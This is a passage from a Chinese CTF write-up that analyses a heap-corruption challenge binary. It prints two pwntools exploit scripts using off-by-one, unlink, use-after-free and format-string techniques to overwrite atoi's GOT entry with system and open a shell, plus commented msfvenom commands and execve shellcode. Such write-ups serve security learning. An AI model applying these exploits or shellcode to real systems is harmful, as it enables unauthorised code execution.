bin内，在下次分配的时候，能够再次分配到该空间，故而我们可以利用该空间将house中的soliders指针地址修改成<code>atoi_got</code>，然后在写入<code>print_plt</code>的地址，利用fmt技术泄漏libc信息，算出system的地址，将atoi_got的地址修改成system地址，即可拿到shell，草稿如下。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">0x605140</div><div class="line"></div><div class="line">|ptr1(0xa0)|xxxxxxxx|xxxxxxxx    </div><div class="line"></div><div class="line"></div><div class="line">0x605158</div><div class="line"></div><div class="line">|money 0x605158|length 0x60515c</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">ptr1 size:0xa0</div><div class="line"></div><div class="line">weapon(size:0x68)|ptr2(0x50) size:0x8|ally(size:0x30)</div><div class="line"></div><div class="line">0x10 0x40</div><div class="line"></div><div class="line"></div><div class="line">ptr2( read soliders 0x50)</div><div class="line"></div><div class="line"></div><div class="line">0x605190 ptr2_addr</div><div class="line"></div><div class="line"></div><div class="line">一些细节：</div><div class="line"></div><div class="line">可以从else中的puts字符串来快速分析判断的是什么</div><div class="line"></div><div class="line">uaf漏洞的分析，看free后，指针是否置0</div><div class="line"></div><div class="line">逆向功底很重要。</div><div class="line"></div><div class="line">strcmp</div><div class="line">strlen</div><div class="line">都可以绕过</div></pre></td></tr></table></figure><p>第一个漏洞的利用exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-08-15 21:50:04</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils,os,time</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line"><span class="comment">#socat TCP4-LISTEN:10001,fork EXEC:./pwn1</span></div><div class="line">target = <span class="string">"./pwn"</span></div><div class="line">remote_ip = <span class="string">""</span></div><div class="line">port = <span class="number">0</span></div><div class="line">rop = roputils.ROP(target)</div><div class="line">elf = ELF(target)</div><div class="line"><span class="comment"># lib = cdll.LoadLibrary('./libc64.so')</span></div><div class="line"><span class="comment"># payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)</span></div><div class="line"><span class="comment"># libc = ELF[target]</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python</span></div><div class="line"><span class="comment">#buf =  ""</span></div><div class="line"><span class="comment"># buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"</span></div><div class="line"><span class="comment"># buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"</span></div><div class="line"><span class="comment"># buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"</span></div><div class="line"><span class="comment"># buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"</span></div><div class="line"><span class="comment"># buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"</span></div><div class="line"><span class="comment"># buf += "\xfd\x10\xf9"</span></div><div class="line"></div><div class="line"><span class="comment"># int 0x80 linux x86 0x1c</span></div><div class="line"><span class="comment"># buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># rop.call('read', 0, addr_bss, 0x100)</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"><span class="comment"># def exec_fmt(payload):</span></div><div class="line"><span class="comment"># p = process(target)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># return p.recvuntil(",")[:-1]</span></div><div class="line"><span class="comment"># autofmt = FmtStr(exec_fmt)</span></div><div class="line"><span class="comment"># offset = autofmt.offset</span></div><div class="line"></div><div class="line"><span class="comment"># def send_payload(payload):</span></div><div class="line"><span class="comment"># sl(payload+"%100000c")</span></div><div class="line"><span class="comment"># autofmt = FmtStr(send_payload,offset=offset)</span></div><div class="line"></div><div class="line"><span class="comment"># autofmt.write(free_hook_addr,one_gadget_addr)</span></div><div class="line"><span class="comment"># autofmt.execute_writes()</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target,env=&#123;<span class="string">"LD_LIBRARY_PATH"</span>:sys.path[<span class="number">0</span>]&#125;)</div><div class="line"></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"><span class="comment"># west</span></div><div class="line">ru(<span class="string">"exit\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_house</span><span class="params">(soliders)</span>:</span></div><div class="line"><span class="comment"># create a house</span></div><div class="line">ru(<span class="string">"war\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"n"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"\x00"</span>*<span class="number">0x10</span>+p32(<span class="number">0x7fffffff</span>))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"-2147483647"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line"><span class="comment">## Words</span></div><div class="line">sd(<span class="string">"a"</span>*<span class="number">0x2e</span>)</div><div class="line"></div><div class="line"><span class="comment">## soliders</span></div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(str(soliders))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(<span class="string">"a"</span>*soliders)</div><div class="line"></div><div class="line"><span class="comment">## ally</span></div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(<span class="string">"a"</span>*<span class="number">0x30</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_house2</span><span class="params">()</span>:</span></div><div class="line"><span class="comment"># create a house</span></div><div class="line">ru(<span class="string">"war\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"n"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"\x00"</span>*<span class="number">0x10</span>+p32(<span class="number">0x7fffffff</span>))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line"><span class="comment"># int overflow</span></div><div class="line">sl(<span class="string">"-2147483647"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line"><span class="comment">## Words</span></div><div class="line">sd(<span class="string">"a"</span>*<span class="number">0x2e</span>)</div><div class="line"></div><div class="line"><span class="comment">## soliders</span></div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(str(<span class="number">0x50</span>))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">'a'</span>*<span class="number">0x38</span>+p64(elf.got[<span class="string">"atoi"</span>]))</div><div class="line"></div><div class="line"><span class="comment">## ally</span></div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(<span class="string">"a"</span>*<span class="number">0x30</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_weapon</span><span class="params">(_id,weapon)</span>:</span></div><div class="line">ru(<span class="string">"war\n"</span>)</div><div class="line">sl(<span class="string">"2"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(str(_id))</div><div class="line">ru(<span class="string">'5000000\n'</span>)</div><div class="line">sl(str(weapon))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_word</span><span class="params">()</span>:</span></div><div class="line">ru(<span class="string">"war\n"</span>)</div><div class="line">sl(<span class="string">"1024"</span>)</div><div class="line">ru(<span class="string">"id\n"</span>)</div><div class="line">sl(<span class="string">"0"</span>)</div><div class="line">ru(<span class="string">" to Death?\n"</span>)</div><div class="line"><span class="comment"># 0x10+0x14</span></div><div class="line">payload = <span class="string">"Not today\x00"</span></div><div class="line">payload = payload.ljust(<span class="number">0x30</span><span class="number">-0x24</span>,<span class="string">"a"</span>)</div><div class="line"><span class="comment"># heap overlay </span></div><div class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0x1c0</span><span class="number">-0x30</span>+<span class="number">1</span>)</div><div class="line">payload = payload.ljust(<span class="number">0x54</span>,<span class="string">"a"</span>)</div><div class="line"><span class="comment"># fake chunck off by one</span></div><div class="line">payload += chr(<span class="number">0x30</span>+<span class="number">0x10</span>)</div><div class="line">sd(payload)</div><div class="line"><span class="comment"># pass</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_war</span><span class="params">()</span>:</span></div><div class="line">ru(<span class="string">"war\n"</span>)</div><div class="line">sl(<span class="string">"4"</span>)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_vassal</span><span class="params">(addr)</span>:</span></div><div class="line">ru(<span class="string">"war\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"id\n"</span>)</div><div class="line">sl(<span class="string">"0"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(str(<span class="number">0x50</span>))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(p64(addr))</div><div class="line">create_house(<span class="number">0x50</span>)</div><div class="line"><span class="comment"># gdb.attach(p,"b*0x401AE2\nc")</span></div><div class="line">create_house(<span class="number">0x40</span>)</div><div class="line">change_weapon(<span class="number">0</span>,<span class="number">4</span>)</div><div class="line">change_weapon(<span class="number">1</span>,<span class="number">5</span>)</div><div class="line">start_war()</div><div class="line"><span class="comment"># race condition</span></div><div class="line">change_word()</div><div class="line"><span class="keyword">import</span> time</div><div class="line">time.sleep(<span class="number">3</span>)</div><div class="line"><span class="comment"># gdb.attach(p,"b*0x402301\nc")</span></div><div class="line"><span class="comment"># unsorted bin FIFO</span></div><div class="line">create_house2()</div><div class="line"><span class="comment"># fmt</span></div><div class="line">change_vassal(elf.symbols[<span class="string">"printf"</span>])</div><div class="line"></div><div class="line">ru(<span class="string">"war\n"</span>)</div><div class="line">sl(<span class="string">"%7$s...."</span>+p64(elf.got[<span class="string">"printf"</span>]))</div><div class="line">printf_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line">offset = <span class="number">0x0000000000054b50</span> - <span class="number">0x0000000000044380</span></div><div class="line">system_addr = printf_addr-offset</div><div class="line"></div><div class="line"><span class="comment"># edit_addr</span></div><div class="line">sl(<span class="string">"%7$n...."</span>+p64(<span class="number">0x605130</span>))</div><div class="line"><span class="comment"># change_vassal(system_addr)</span></div><div class="line"><span class="comment"># gdb.attach(p,"b*0x402301\nc")</span></div><div class="line">ru(<span class="string">"war\n"</span>)</div><div class="line">sl(<span class="string">"123"</span>)</div><div class="line">ru(<span class="string">"id\n"</span>)</div><div class="line">sd(<span class="string">"\n"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(<span class="string">"a"</span>*<span class="number">0x7</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line"></div><div class="line">sl(p64(system_addr))</div><div class="line"></div><div class="line">ru(<span class="string">"war\n"</span>)</div><div class="line">sl(<span class="string">"/bin/sh\x00"</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure><h3 id="第二个漏洞"><a href="#第二个漏洞" class="headerlink" title="第二个漏洞"></a>第二个漏洞</h3><p>第二个漏洞出现在east模块，该模块下，存储slaves的长度被设计成为 chunk_size-8，而chunks_size由于其末三位是标记位，prev_size标记位于第8位，该标记位在前一个chunk在使用中时置1，故而当我们过呢关系slaves时，我们拥有一个字节的溢出，即off by one。我们可以利用这一个字节的溢出来修改下一个chunk的prev_size和其标记位来为实现overlay heap 和 unlink 攻击做铺垫（事实上这边只用到了unlink攻击，向前unlink），这边其实卡了我很久，一开始在想向前合并还是向后合并，后来尝试向后合并，但是 loyalty chunk的大小是0xe0+0x10 向后合并需要在下一个chunk构建fake_chunk_head，故而需要伪造 loyalty chunk_size 的字段值，使其满足寻址（找到下一个chunk）的逻辑，这个值是<code>0xe0+0x10+0x1+0x10=0x101</code>，很遗憾，需要溢出两个字节才能达到要求，而我们并没有溢出两个字节的条件。故而想到向前合并，在loyalty chunk的前一个chunk中构建fake_chunk_head，将loyalty chunk_size_prev_flag置0，构造loyalty prev_size，触发free loyalty chunk，我们便可以获得一次任意地址写的机会~~利用代码如下，其实直接看代码就可以，逻辑很清晰。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-08-17 00:53:09</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils,os,time</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line"><span class="comment">#socat TCP4-LISTEN:10001,fork EXEC:./pwn1</span></div><div class="line">target = <span class="string">"./pwn"</span></div><div class="line">remote_ip = <span class="string">""</span></div><div class="line">port = <span class="number">0</span></div><div class="line">rop = roputils.ROP(target)</div><div class="line">elf = ELF(target)</div><div class="line"><span class="comment"># lib = cdll.LoadLibrary('./libc64.so')</span></div><div class="line"><span class="comment"># payload = rop.call('__isoc99_scanf', 0x804888F,0x0804A034)</span></div><div class="line"><span class="comment"># libc = ELF[target]</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -b "\x0b\x00" -f python</span></div><div class="line"><span class="comment">#buf =  ""</span></div><div class="line"><span class="comment"># buf += "\x2b\xc9\x83\xe9\xf5\xe8\xff\xff\xff\xff\xc0\x5e\x81"</span></div><div class="line"><span class="comment"># buf += "\x76\x0e\x7d\x30\x90\xf9\x83\xee\xfc\xe2\xf4\x17\x3b"</span></div><div class="line"><span class="comment"># buf += "\xc8\x60\x2f\x56\xf8\xd4\x1e\xb9\x77\x91\x52\x43\xf8"</span></div><div class="line"><span class="comment"># buf += "\xf9\x15\x1f\xf2\x90\x13\xb9\x73\xab\x95\x38\x90\xf9"</span></div><div class="line"><span class="comment"># buf += "\x7d\x1f\xf2\x90\x13\x1f\xe3\x91\x7d\x67\xc3\x70\x9c"</span></div><div class="line"><span class="comment"># buf += "\xfd\x10\xf9"</span></div><div class="line"></div><div class="line"><span class="comment"># int 0x80 linux x86 0x1c</span></div><div class="line"><span class="comment"># buf = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80";</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="comment"># bss = rop.section('.bss')</span></div><div class="line"><span class="comment"># rop.got('puts')</span></div><div class="line"><span class="comment"># rop.call('read', 0, addr_bss, 0x100)</span></div><div class="line"><span class="comment"># msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'</span></div><div class="line"></div><div class="line"><span class="comment"># def exec_fmt(payload):</span></div><div class="line"><span class="comment"># p = process(target)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># p.recvuntil("input:")</span></div><div class="line"><span class="comment"># p.sendline(payload)</span></div><div class="line"><span class="comment"># return p.recvuntil(",")[:-1]</span></div><div class="line"><span class="comment"># autofmt = FmtStr(exec_fmt)</span></div><div class="line"><span class="comment"># offset = autofmt.offset</span></div><div class="line"></div><div class="line"><span class="comment"># def send_payload(payload):</span></div><div class="line"><span class="comment"># sl(payload+"%100000c")</span></div><div class="line"><span class="comment"># autofmt = FmtStr(send_payload,offset=offset)</span></div><div class="line"></div><div class="line"><span class="comment"># autofmt.write(free_hook_addr,one_gadget_addr)</span></div><div class="line"><span class="comment"># autofmt.execute_writes()</span></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">p = process(target,env=&#123;<span class="string">"LD_LIBRARY_PATH"</span>:sys.path[<span class="number">0</span>]&#125;)</div><div class="line"></div><div class="line"><span class="keyword">else</span>:</div><div class="line">p = remote(remote_ip,port)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line"><span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"><span class="comment"># east</span></div><div class="line">ru(<span class="string">"exit\n"</span>)</div><div class="line">sl(<span class="string">"2"</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Occupy</span><span class="params">(slaves,date)</span>:</span></div><div class="line">ru(<span class="string">"Exit\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"choice:\n"</span>)</div><div class="line">sl(<span class="string">"1"</span>)</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(str(slaves))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sl(date)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_slaves</span><span class="params">(_id,date)</span>:</span></div><div class="line">ru(<span class="string">"Exit\n"</span>)</div><div class="line">sl(<span class="string">"2"</span>)</div><div class="line">ru(<span class="string">"id\n"</span>)</div><div class="line">sl(str(_id))</div><div class="line">ru(<span class="string">"\n"</span>)</div><div class="line">sd(str(date))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ruin</span><span class="params">(_id,flag)</span>:</span></div><div class="line">ru(<span class="string">"Exit\n"</span>)</div><div class="line">sl(<span class="string">"3"</span>)</div><div class="line">ru(<span class="string">"ruin\n"</span>)</div><div class="line">sl(str(_id))</div><div class="line">ru(<span class="string">"nate him?(y/n)"</span>)</div><div class="line">sl(flag)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(_id)</span>:</span></div><div class="line">ru(<span class="string">"Exit\n"</span>)</div><div class="line">sl(<span class="string">"4"</span>)</div><div class="line">ru(<span class="string">"id\n"</span>)</div><div class="line">sl(str(_id))</div><div class="line"></div><div class="line">Occupy(<span class="number">0x40</span>,<span class="string">"123"</span>) <span class="comment">#0</span></div><div class="line">ru(<span class="string">"Khal"</span>)</div><div class="line">sl(<span class="string">"123"</span>)</div><div class="line">Occupy(<span class="number">0x40</span>,<span class="string">"123"</span>) <span class="comment">#1</span></div><div class="line">Occupy(<span class="number">0x40</span>,<span class="string">"123"</span>) <span class="comment">#2</span></div><div class="line"><span class="comment"># get fastbin#2 addr</span></div><div class="line">ruin(<span class="number">2</span>,<span class="string">"n"</span>)</div><div class="line">ruin(<span class="number">1</span>,<span class="string">"n"</span>)</div><div class="line">show(<span class="number">1</span>)</div><div class="line">ru(<span class="string">"salves: "</span>)</div><div class="line">fast_bin_addr  = u64(ru(<span class="string">"\n="</span>)[:<span class="number">-2</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line"><span class="keyword">print</span> <span class="string">"fast_bin_addr#0="</span>+hex(fast_bin_addr)</div><div class="line"></div><div class="line"><span class="comment"># heap_base addr</span></div><div class="line"></div><div class="line">heap_addr = fast_bin_addr-(fast_bin_addr &amp; <span class="number">0xfff</span>)</div><div class="line">fast_bin_addr_ptr = heap_addr+<span class="number">0x10</span>+<span class="number">0x20</span></div><div class="line"></div><div class="line"><span class="comment"># rebuild </span></div><div class="line">Occupy(<span class="number">0x40</span>,<span class="string">"123"</span>) <span class="comment">#1</span></div><div class="line">Occupy(<span class="number">0x40</span>,<span class="string">"123"</span>) <span class="comment">#2</span></div><div class="line"></div><div class="line"><span class="comment"># overwrite small chunk size  unlink prev_fast_chunk</span></div><div class="line"></div><div class="line">fake_chunk_head = p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>)+p64(fast_bin_addr_ptr<span class="number">-0x18</span>)+p64(fast_bin_addr_ptr<span class="number">-0x10</span>)</div><div class="line">payload = fake_chunk_head</div><div class="line">payload = payload.ljust(<span class="number">0x40</span>,<span class="string">"\x00"</span>)</div><div class="line">update_slaves(<span class="number">0</span>,payload+p64(<span class="number">0x40</span>)+chr(<span class="number">0xe0</span>+<span class="number">0x10</span>))</div><div class="line"><span class="comment"># unlink</span></div><div class="line">ruin(<span class="number">1</span>,<span class="string">"y"</span>)</div><div class="line"><span class="comment"># gdb.attach(p,"b*0x40131D\nc")</span></div><div class="line"><span class="comment"># change atoi to printf</span></div><div class="line">update_slaves(<span class="number">0</span>,<span class="string">"a"</span>*<span class="number">0x18</span>+p64(elf.got[<span class="string">"atoi"</span>]))</div><div class="line">update_slaves(<span class="number">0</span>,p64(elf.symbols[<span class="string">"printf"</span>]))</div><div class="line"></div><div class="line"><span class="comment"># leak libc and calc system_addr</span></div><div class="line">ru(<span 